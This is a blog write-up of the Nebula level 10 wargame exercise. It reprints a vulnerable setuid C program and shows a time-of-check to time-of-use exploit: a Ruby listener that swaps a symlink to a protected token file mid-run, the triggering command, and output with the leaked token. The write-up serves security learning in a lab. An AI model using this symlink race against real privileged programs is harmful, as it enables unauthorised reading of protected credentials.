---
layout: post
title: "Exploit Exercises - Nebula Level 10"
date: 2014-01-25 12:40:53 +0800
comments: true
categories: 
- Security
- Exercises
- Nebula
---

### About

The setuid binary at */home/flag10/flag10* binary will upload any file given, as long as it meets the requirements of the *access()* system call.

To do this level, log in as the *level10* account with the password *level10*. Files for this level can be found in /home/flag10.

### Source Code

``` c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
    exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
    int fd;
    int ffd;
    int rc;
    struct sockaddr_in sin;
    char buffer[4096];
  	
    printf("Connecting to %s:18211 .. ", host); fflush(stdout);
  	
    fd = socket(AF_INET, SOCK_STREAM, 0);
  	
    memset(&sin, 0, sizeof(struct sockaddr_in));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(host);
    sin.sin_port = htons(18211);
  	
    if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
      printf("Unable to connect to host %s\n", host);
      exit(EXIT_FAILURE);
    }
  	
#define HITHERE ".oO Oo.\n"
    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf("Unable to write banner to host %s\n", host);
      exit(EXIT_FAILURE);
    }
#undef HITHERE
  
    printf("Connected!\nSending file .. "); fflush(stdout);
  	
    ffd = open(file, O_RDONLY);
    if(ffd == -1) {
      printf("Damn. Unable to open file\n");
      exit(EXIT_FAILURE);
    }
  	
    rc = read(ffd, buffer, sizeof(buffer));
    if(rc == -1) {
      printf("Unable to read from file: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
    }
  	
    write(fd, buffer, rc);
  	
    printf("wrote file!\n");
  } else {
    printf("You don't have access to %s\n", file);
  }
}
```

<!-- more -->

There at two files in the directory /home/flag10, *flag10* and *token*. The source code of executable *flag10* in shown above, and *token* contains the password of user *flag10*. The goal is to read the content of *token*.

The attack comes from a common bug called [Time of check to time of use](http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use), the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like: 

1. pass */home/level10/token* whick links to a real user(*level10*) readable file */home/level10/test* to the program as `argv[1]`
2. */home/flag10/flag10* checks whether this file is accessable at line 24(with the result true)
3. modify the file to link to */home/flag10/token* when */home/flag10/flag10* is executing code between line 24 and line 54
4. when */home/flag10/flag10* reads the file at line 54, it reads */home/flag10/token*

The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the *flag10* program will send a banner before actually read the file(line 46), this leaves me some time to make some change!

Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file */home/level10/token* immediately after the server accepts a connection from the client, I wrote this server code in Ruby:

``` ruby
require 'socket'

server = TCPServer.new(18211)
loop {
    client = server.accept
    `rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
    while msg = client.gets
        puts "RECV: #{msg}"
    end
}
```

After the server was started, I triggered the vulnerability with the following command

	$ /home/flag10/flag10 ~/token 127.0.0.1

Note that the symbolic file *~/token* must exist and point to a file that is readable by user *level10* before the program *flag10* is executed. 

The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!

``` bash
level10@nebula:~$ ruby serv.rb 
RECV: .oO Oo.
RECV: hello world

level10@nebula:~$ ruby serv.rb 
RECV: .oO Oo.
RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```
